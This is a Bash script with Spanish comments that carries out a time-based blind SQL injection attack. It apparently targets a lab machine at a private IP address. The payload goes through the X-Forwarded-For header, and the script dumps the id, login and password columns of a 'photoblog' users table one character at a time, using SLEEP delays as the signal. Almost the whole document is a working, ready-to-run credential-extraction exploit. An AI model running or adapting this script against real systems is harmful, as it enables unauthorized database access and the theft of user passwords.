#!/bin/bash
# Este script extrae los valores de las columnas id, login y password en la tabla users de la base de datos photoblog. Este script utilizará una técnica de inyección SQL ciega para iterar sobre las filas de la tabla y extraer cada valor carácter por carácter
# Descripción: Extraemos los valores de cada columna, fila por fila, en la tabla users. Definimos un número máximo de filas (max_rows) para limitar la búsqueda y evitar que el script se prolongue indefinidamente.
# Procedimiento:
# Recorre cada fila y columna que queremos extraer.
#  Usa SUBSTRING para extraer el valor carácter a carácter, simulando la inyección SQL ciega con SLEEP(0.043) como indicador de éxito.
# Interrupción cuando el valor está completo: Si no se encuentra un carácter en una posición, el script asume que el valor está completo.
# Para cada fila, el script imprime el valor completo de id, login, y password.
# _..::Actualización::.._
# Si el column_value resulta vacío en una iteración, la variable finished se establece en true, lo que detiene el volcado.

url="http://192.168.44.134"
expected_delay=1.0
db_name="photoblog"
table_name="users"           # Tabla a explorar
columns=("id" "login" "password")  # Columnas de la tabla
characters="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
row_index=0  # Índice de la fila
finished=false

echo -e "\nIniciando volcado de datos de la tabla '$table_name'...\n"

while [ "$finished" = false ]; do
    row_data=()
    for column in "${columns[@]}"; do
        column_value=""
        position=1
        while true; do
            found_char=false
            for char in $(echo $characters | fold -w1); do
                # Construye el payload para cada carácter de la columna
                payload="1' OR IF((SELECT SUBSTRING($column,$position,1) FROM $db_name.$table_name LIMIT $row_index,1)='$char', SLEEP(0.043), 0) #"
                
                start=$(date +%s.%N)
                response=$(curl -s -w "%{time_total}" -o /dev/null -H "X-Forwarded-For: $payload" "$url")
                end=$(date +%s.%N)
                duration=$(echo "$end - $start" | bc)

                if (( $(echo "$duration > $expected_delay" | bc -l) )); then
                    column_value+=$char
                    found_char=true
                    break
                fi
            done

            if [ "$found_char" = false ]; then
                break
            fi
            position=$((position + 1))
        done

        if [ -z "$column_value" ]; then
            finished=true
            break
        else
            row_data+=("$column_value")
        fi
    done

    if [ "$finished" = false ]; then
        echo "Fila $row_index: ${row_data[@]}"
        row_index=$((row_index + 1))
    fi
done

echo -e "\n[!] Volcado de la tabla '$table_name' completado."
